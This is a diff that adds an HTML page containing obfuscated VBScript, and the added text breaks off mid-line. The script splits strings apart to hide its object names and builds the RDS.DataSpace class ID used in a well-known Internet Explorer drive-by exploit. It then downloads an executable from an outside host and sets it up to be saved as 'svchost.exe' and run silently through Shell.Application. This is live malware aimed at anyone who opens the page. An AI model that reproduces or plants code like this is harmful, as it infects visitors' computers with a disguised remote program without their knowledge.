@@ -1,0 +1,35 @@
+    <html><body>
+    <script language="VBScript">
+    on error resume next
+    wm1="o"&"bj"&"ect"
+    wm2="classid"
+    zwm="C"&"5"&"5"&"6"&"-"&"65"&"A3"&"-"
+    ywm="cl"&"si"&"d"&":"&"BD"&"96"
+    xwm="-"&"9"&"8"&"3"&"A"
+    wwm="-"&"00C"&"04F"&"C29E"&"36"
+    wm3=ywm & "" & zwm
+    wm3=wm3 & "11"&"D0"& xwm & wwm
+    wm4="M"&"icro"&"soft"&".XMLHTTP"
+    wm5="Shell.Application"
+    wm6="Scripti"&"ng.Fil"&"eSystemObject"
+    Set XsKjWMc = document.createElement(wm1)
+    XsKjWM = "h"+"t"+"t"+"p"+":"+"/"+"/"+"d"+"o"+"w"+"n"+".fafa52.cn/down/ko.exe"
+    sub yunxingexe(wm5,Xskj9)
+    set XsKjWMeE = XsKjWMc.createobject(wm5,"")
+    XsKjWMeE.shEllExEcutE XsKjWM9,"","","o"&"p"&"e"&"n",0
+    end sub
+    XsKjWMc.setAttribute wm2, wm3
+    XsKjWMi=wm4
+    Set DXsKjWM = XsKjWMc.CreateObject(XsKjWMi,"")
+    wpa="A"&"d"&"o"&"d"&"b"&"."
+    wpc="S"&"t"&"r"
+    wpd="e"&"a"&"m"
+    XsKjWMf = wpa & wpc & wpd
+    XsKjWMg=XsKjWMf
+    set XsKjWMa = XsKjWMc.cReatEObjeCt(XsKjWMg,"")
+    XsKjWMa.type = 1
+    XsKjWMh="G"&"E"&"T"
+    DXsKjWM.Open XsKjWMh, XsKjWM, False
+    DXsKjWM.Send
+    XsKjWM9="svchost.exe"
+    SeT XsKjWMb = XsKjWMc.cr
